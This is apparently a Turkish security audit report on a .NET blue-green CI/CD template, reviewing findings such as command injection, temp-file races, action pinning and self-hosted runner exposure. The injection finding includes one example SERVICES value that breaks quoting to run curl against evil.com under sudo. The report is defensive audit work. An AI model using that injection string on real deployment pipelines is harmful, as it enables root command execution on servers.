# Güvenlik Denetim Raporu — dotnet-cicd-template

**Kapsam:** `SV&V (Software Verification & Validation)` perspektifinden manuel kod incelemesi.  
**Tarih:** 2026-07-08  
**İncelenen dosyalar:** `production-deploy.yml`, `production-rollback.yml`, `continuous-integration.yml`, `reusable-dotnet-build.yml`, `pipeline.sh`, `ssh-remote.sh`, `verify-health.sh`, `setup-host.sh`, `build-test/action.yml`  
**Mimari:** Blue-green (nginx + Unix socket, `cicd` grubu)  
**Yöntem:** Statik analiz / kod okuma — çalışan ortam testi yapılmamıştır.  
**Not:** Bu rapor yalnızca bulgular içerir; **raporda onay olmadan hiçbir kod değişikliği yapılmayacaktır.**

---

## Özet Puan Tablosu

| ID | Başlık | Önem | Dosya | Durum |
|---|---|---|---|---|
| INJ-01 | `remote_sudo` komut enjeksiyonu (SERVICES alanları) | **ORTA** | `pipeline.sh` | **GİDERİLDİ** |
| TMP-01 | Uzak geçici dosya yolu tahmin edilebilir (`/tmp/cicd-env-$$`) | **DÜŞÜK** | `pipeline.sh` | **GİDERİLDİ** |
| PIN-01 | Action sürümlerinde SHA yerine etiket kullanımı | **DÜŞÜK-ORTA** | Tüm workflow'lar | **GİDERİLDİ** (Dependabot) |
| NX-01 | nginx socket izin modeli (cicd grubu, UMask) | **BİLGİ** | `setup-host.sh` | Kabul edilebilir (tasarım gereği) |
| FORK-01 | `pull_request` tetikleyicisi + self-hosted runner | **DÜŞÜK** | `continuous-integration.yml` | Açık (private repo kabul edilebilir) |
| CLEANUP-01 | SSH anahtar dosyası `SIGKILL`'de temizlenmiyor | **BİLGİ** | `ssh-remote.sh` | Açık (standart kısıt) |

Tespit edilen **yüksek önem** bulgusu yoktur.

---

## Bulgu Detayları

### INJ-01 — `remote_sudo` Komut Enjeksiyonu ✅ GİDERİLDİ
**Önem:** ORTA  
**Dosya/Satır:** `pipeline.sh`, `target_publish_dir`, `target_write_env_one`, `target_restart_one`

**Kanıt:**
```bash
# pipeline.sh – target_publish_dir
remote_sudo "mkdir -p '$dest'"

# pipeline.sh – target_restart_one
remote_sudo "systemctl restart '${unit}'"
```

`$dd` (deploy_dir) ve `$svc` (service_name) değerleri `SERVICES` repo değişkeninden gelir. `remote_sudo` içinde bu değerler tek-tırnak içine yerleştirilir; ancak `$dd` veya `$svc` değeri tek-tırnak (`'`) içeriyorsa bash string'i parçalanır ve enjekte edilen komut `sudo bash -c` ile çalışır.

**Örnek saldırı vektörü:**  
```
SERVICES="web|src/Web.csproj|/opt/myapp'; curl http://evil.com|myapp-web|http://127.0.0.1:5000"
```
Bu değer deploy_dir'e `/opt/myapp'` yerleştirerek `remote_sudo` string'ini kırar.

**Azaltıcı faktörler:**
- `SERVICES` yalnızca repo yöneticileri tarafından ayarlanabilir (GitHub Settings → Variables), dolayısıyla saldırı vektörü **içeriden** veya ele geçirilmiş bir GitHub hesabı gerektirir.
- `printf '%q'` SSH kanalını güvenli hale getirir; sorun bash string'inin kendisindedir.
- Üretim repo'ları genellikle kısıtlı erişimlidir; gerçek dünya riski düşüktür.

**Uygulanan düzeltme:** `pipeline.sh`'e `validate_path_field()` ve `validate_name_field()` fonksiyonları eklendi. `validate_services()` her komut çalışmadan önce SERVICES içindeki `deploy_dir` (alan 3) ve `service_name` (alan 4) değerlerini whitelist regex ile doğrular (`^[a-zA-Z0-9/_.@-]+$` / `^[a-zA-Z0-9_.@-]+$`). Geçersiz karakter içeren değer `exit 1` ile hemen reddedilir. Mevcut kullanımları etkilemez; bu karakterlerin dışına çıkan hiçbir geçerli Unix yolu veya systemd birim adı yoktur.

---

### PIN-01 — Action Sürümlerinde SHA Yerine Etiket ✅ GİDERİLDİ (Dependabot)
**Önem:** DÜŞÜK-ORTA  
**Dosya/Satır:** Tüm workflow'lar

**Kanıt:**
```yaml
uses: actions/checkout@v4
uses: actions/cache@v4
uses: actions/upload-artifact@v4
```

**Sorun:** `@v4` gibi etiketler GitHub tarafından herhangi bir zamanda yeni bir commit'e yönlendirilebilir (tag mutation). Güvenlik standartlarına (SLSA L3, OpenSSF Scorecard) göre commit SHA ile pin'leme önerilir:
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

**Azaltıcı faktörler:**
- `actions/checkout`, `actions/cache`, `actions/upload-artifact` GitHub'ın resmi action'larıdır; kötü amaçlı değişiklik olasılığı düşüktür.
- Self-hosted runner ortamı, GitHub-hosted runner'a göre zaten kontrollüdür.
- Bu template bir şablon reposudur; kullanıcı reposu bu action'ları kendi workflow'larında çalıştırır — GitHub-hosted runner kullanılıyorsa risk daha anlamlıdır.

**Uygulanan düzeltme:** `templates/.github/dependabot.yml` eklendi (package-ecosystem: github-actions, haftalık tarama). Template'ten türetilen her repo otomatik olarak Dependabot PR'ları alır; action güncellemeleri gözden geçirilip merge edilebilir. Mevcut hiçbir kodu değiştirmez; sadece yeni bir config dosyası ekler.

---

### FORK-01 — `pull_request` + Self-Hosted Runner
**Önem:** DÜŞÜK  
**Dosya/Satır:** `continuous-integration.yml`, satır 13–14

**Kanıt:**
```yaml
on:
  pull_request:
    branches: [ main ]
```

**Sorun:** Repo herkese açık olursa, fork'tan gelen PR'lar `pull_request` olayını tetikler ve **self-hosted runner üzerinde fork'taki kod çalışır**. Bu, runner'da yerel erişim anlamına gelebilir.

**Azaltıcı faktörler:**
- Template genellikle **private** proje repolarında kullanılır; fork PR senaryosu tipik kullanımda yoktur.
- GitHub, fork PR'lar için self-hosted runner'da gizli değişkenleri maskeler (Secrets fork'a açılmaz).

**Önerilen düzeltme (opsiyonel, onayınızı bekliyor):** Eğer repo herkese açık olacaksa `pull_request_target` yerine `pull_request` kullanımı ve `environment: ci-review` gibi bir approval gate eklenebilir. Private repo için mevcut haliyle kabul edilebilir.

---

### TMP-01 — Uzak Geçici Dosya Yolu (`/tmp/cicd-env-$$`) ✅ GİDERİLDİ
**Önem:** DÜŞÜK  
**Dosya/Satır:** `pipeline.sh` – `target_write_env_one`

**Kanıt:**
```bash
local tmp="/tmp/cicd-env-$$"
remote_write_file "$content" "$tmp" 600
remote_sudo "mv '$tmp' '${dd}/.env' && chmod 600 '${dd}/.env' && ..."
```

**Sorun:** `/tmp/cicd-env-<PID>` yolu, PID tahmin edilerek sembolik bağlantı (symlink) saldırısına konu olabilir: hedef sunucuya yerel erişimi olan bir saldırgan dosyadan önce bu yola symlink yerleştirirse rsync farklı bir dosyanın üzerine yazabilir (TOCTOU).

**Azaltıcı faktörler:**
- Saldırı, hedef sunucuda **yerel bir hesap** gerektirir.
- Deploy kullanıcısı dışında bir hesap bu sunucuda bulunuyor olmalıdır.
- Güvenli sunucu ortamlarında pratikte ihmal edilebilir.

**Uygulanan düzeltme:** `tmp="$(remote_ssh "mktemp /tmp/cicd-env-XXXXXX")"` ile rassal suffix üretilir. `mktemp` tüm modern Linux dağıtımlarında vardır; işleyiş değişmez.

---

### NX-01 — nginx Socket İzin Modeli
**Önem:** BİLGİ  
**Dosya:** `setup-host.sh`

**Model:** Her blue/green systemd birimi `Group=cicd`, `UMask=0007` ile çalışır. Kestrel bu ayarlarla Unix socket'i `0660 root:cicd` olarak oluşturur. nginx kullanıcısı (`www-data`/`nginx`) `usermod -aG cicd` ile `cicd` grubuna eklenmiştir; dolayısıyla nginx socket'e bağlanabilir. Diğer sistem kullanıcıları grupta değilse sokete erişemez.

**Deploy kullanıcısı ve health kontrolü:** Deploy kullanıcısı `cicd` grubuna **eklenmez** (yüzey daraltılır). Bu nedenle pipeline'ın idle renk socket sağlık kontrolü (`pipeline.sh health`), socket'e `sudo` (root) ile erişir (`remote_sudo_stdin`). Root her socket'e erişebildiğinden bu doğru çalışır ve deploy kullanıcısının socket grubuna dahil edilmesine gerek kalmaz. Bu, zaten gereken `NOPASSWD: ALL` yetkisiyle tutarlıdır (bkz. operasyonel not).

**Değerlendirme:**
- `cicd` grubu yalnızca nginx ve .NET servis kullanıcılarını içerir; deploy kullanıcısı grupta değildir — dar kapsam iyi uygulama.
- `RuntimeDirectoryPreserve=yes` iki renk aynı anda çalışırken `/run/cicd/` silinmesini önler.
- Sistemd `RuntimeDirectory=cicd` her unit başlatılışında `/run/cicd/` sahipliğini `root` olarak ayarlar; grub `cicd` bırakır (mode `0750`); bu tasarım socket erişimini kontrollü tutar.
- **Potansiyel öneri:** `Group=cicd` birimlerin *aynı* `cicd` grubunu kullanması socket erişimini `nginx` ile paylaşır ancak sistemdeki başka `cicd` üyelerini de dahil eder; bu kullanıcı sayısını mümkün olduğunca az tutarak yönetilebilir kılar.

**Karar:** Tasarım gereği kabul edilebilir; dokümantasyonda belirtilmiştir.

---

### CLEANUP-01 — SSH Anahtar Dosyası `SIGKILL`'de Temizlenmiyor
**Önem:** BİLGİ  
**Dosya/Satır:** `ssh-remote.sh`, satır 123

**Kanıt:**
```bash
trap ssh_remote_cleanup EXIT
```

**Sorun:** `SIGKILL` sinyali bash `trap` mekanizmasını atlatır. Pipeline süreç `kill -9` ile sonlandırılırsa `$SSH_KEY_FILE` geçici dosyası (`chmod 600`) temizlenmeden kalabilir.

**Azaltıcı faktörler:**
- Dosya `chmod 600` ile korunur; başka kullanıcılar okuyamaz.
- CI runner'ında her job'ın kendi çalışma alanı vardır; job sona erince runner ortamı temizlenir.
- `SIGKILL` ile job sonlandırma GitHub Actions'ta nadirdir.

**Önerilen düzeltme (opsiyonel):** `tmpfs`-tabanlı geçici dizin veya runner job sonrası temizleme scripti; pratik olarak mevcut durum kabul edilebilir.

---

## Olumlu Bulgular (İyi Uygulanan)

| Alan | Kanıt |
|---|---|
| En az yetki (least privilege) | Tüm workflow'larda `permissions: contents: read` (deploy'da ek `actions: read`) |
| Artifact köken doğrulaması (provenance) | `production-deploy.yml`: `headSha == github.sha` kontrolü |
| SSH güvenliği | `StrictHostKeyChecking=yes`, `BatchMode=yes`, `ConnectTimeout=15` |
| SSH anahtar ömrü | Geçici dosya (`mktemp`), `chmod 600`, `trap ... EXIT` temizleme |
| PerSourcePenalties önlemi | `ssh-keyscan` tekrar edilmiyor; `ssh-keygen -F` ile önce kontrol |
| Gizli bilgi sızıntısı yok | Hiçbir `echo` / `cat` komutu secret değerleri loglara yazmıyor |
| Onay kapısı | `environment: production` + required reviewers + prevent self-review |
| Eşzamanlılık kontrolü | `concurrency: group: deploy-${{ github.repository }}, cancel-in-progress: false` |
| Blue-green fail-safe | Health socket geçemezse nginx geçişi yapılmaz; canlı etkilenmez; job başarısız |
| Validate adımı | Deploy başlangıcında SERVICES, SSH değişkenleri doğrulanıyor |
| Socket izin modeli | `cicd` grubu, `UMask=0007` → socket `0660`; yalnızca nginx erişir |

---

## Sonuç

Şablon genel olarak **güvenli** bir tasarıma sahiptir. Kullanıcı onayıyla üç bulgu giderildi:

- **INJ-01 (ORTA):** `validate_services()` ile SERVICES alanları whitelist doğrulamasından geçiyor.
- **TMP-01 (DÜŞÜK):** Uzak geçici dosya `mktemp` ile rassal isim alıyor.
- **PIN-01 (DÜŞÜK-ORTA, kısmi):** `dependabot.yml` action güncellemelerini otomatik izler. **Not:** Bu tam bir azaltma değildir — action'lar hâlâ `@v4` etiket ile pinlenmiştir; SLSA düzeyinde katı güvenlik için tam commit SHA pinleme ayrıca yapılmalıdır. Dependabot yalnızca güncelleme PR'ları önerir.

**Açık / kabul edilebilir bulgular:**

- **NX-01 (BİLGİ):** nginx socket izin modeli `cicd` grubu + UMask tasarımı kabul edilebilir; `cicd` grubunu dar tutun.
- **FORK-01 (DÜŞÜK):** `pull_request` + self-hosted runner riski yalnızca **public** repo'da anlamlıdır. Bu şablon private proje repoları için tasarlanmıştır; public kullanımda PR'lar için ek bir onay kapısı önerilir.
- **CLEANUP-01 (BİLGİ):** `SIGKILL` sonrası geçici SSH anahtar dosyası bilinen bir kısıttır; `chmod 600` ve izole runner çalışma alanı ile pratik risk düşüktür.

**Operasyonel not (güvenlik dışı ama kritik):** `remote_sudo` komutları hedef sunucuda `sudo bash -c "..."` ile çalışır; bu yüzden deploy kullanıcısı **tam `NOPASSWD: ALL`** yetkisine ihtiyaç duyar (dar komut whitelist'i çalışmaz). Bu, tasarımın bilinçli bir sonucudur ve dokümantasyonda (README + company-setup) belirtilmiştir.
